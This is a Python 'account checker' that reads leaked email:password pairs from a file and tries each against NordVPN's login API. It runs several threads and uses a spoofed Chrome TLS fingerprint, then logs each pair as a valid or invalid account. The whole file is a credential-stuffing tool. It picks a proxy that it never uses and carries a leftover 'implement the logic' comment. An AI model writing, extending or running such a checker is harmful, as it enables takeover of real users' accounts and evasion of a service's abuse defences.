import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests, colorama, pystyle, datetime, uuid, functools
import logging
from tls_client import Session
from pystyle import Colorate, Colors

logging.basicConfig(level=logging.INFO)

def my_ui():
    print(Colorate.Horizontal(Colors.yellow_to_red, """
  _______ _      _      _______ _______ _______ 
 |       |      |      |       |       |       |
 |  _____|  _  |      |   _   |       |  _____|
 | |       | | |      |  | |  |       | |_____ 
 | |_____  | |_|      |  | |  |_____  |_____  |
 |_______| |_______|  |___| |_______|_______

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""))

def nordvpn_checker(email, password):
    try:
        if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
            logging.error("No proxies available")
            return

        proxies = [line.strip() for line in open("proxies.txt", "r").readlines()]
        if not proxies:
            logging.error("No proxies available")
            return

        proxy = random.choice(proxies)
        session = Session(client_identifier="chrome_114", random_tls_extension_order=True)

        # Implement the logic to check NordVPN account validity
        response = session.post("https://api.nordvpn.com/v1/users/login", json={"email": email, "password": password})
        if response.status_code == 200:
            valid = True
        else:
            valid = False

        if valid:
            logging.info(f"Valid account: {email}:{password}")
        else:
            logging.info(f"Invalid account: {email}:{password}")
    except Exception as e:
        logging.error(f"Error: {e}")

if __name__ == "__main__":
    my_ui()

    if not os.path.exists("accounts.txt") or os.path.getsize("accounts.txt") == 0:
        logging.error("No accounts available")
        sys.exit(1)

    with open("accounts.txt", "r") as f:
        accounts = [line.strip().split(":") for line in f.readlines()]
        if not accounts:
            logging.error("No accounts available")
            sys.exit(1)

    try:
        import tls_client
    except ImportError:
        logging.error("tls_client library not installed")
        sys.exit(1)

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(nordvpn_checker, email, password) for email, password in accounts]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error: {e}")
